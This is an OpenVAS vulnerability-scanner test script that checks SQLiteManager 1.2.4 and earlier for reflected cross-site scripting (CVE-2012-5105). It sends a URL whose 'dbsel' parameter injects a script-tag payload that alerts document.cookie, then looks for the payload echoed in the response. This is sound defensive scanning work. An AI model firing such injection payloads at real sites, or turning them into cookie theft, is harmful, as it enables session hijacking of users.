###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sqlitemanager_mult_xss_vuln.nasl 11651 2018-09-27 11:53:00Z asteins $
#
# SQLiteManager 'dbsel' And 'nsextt' Parameters Multiple XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802373");
  script_version("$Revision: 11651 $");
  script_cve_id("CVE-2012-5105");
  script_bugtraq_id(51294);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-27 13:53:00 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-01-06 13:17:25 +0530 (Fri, 06 Jan 2012)");
  script_name("SQLiteManager 'dbsel' And 'nsextt' Parameters Multiple XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521126");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108393/sqlitemanager124-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_sqlitemanager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sqlitemanager/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.");
  script_tag(name:"affected", value:"SQLiteManager version 1.2.4 and prior.");
  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input
via the 'dbsel' or 'nsextt' parameters to index.php or main.php script, which
allows attacker to execute arbitrary HTML and script code on the user's
browser session in the security context of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running SQLiteManager and is prone to multiple
cross site scripting vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

CPE = 'cpe:/a:sqlitemanager:sqlitemanager';

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/main.php?dbsel=</script><script>alert(document.cookie)</script>";

if(http_vuln_check(port:port, url:url, pattern:"</script><script>alert\(" +
                               "document.cookie\)</script>", check_header: TRUE)){
  security_message(port:port);
	exit(0);
}

exit(99);
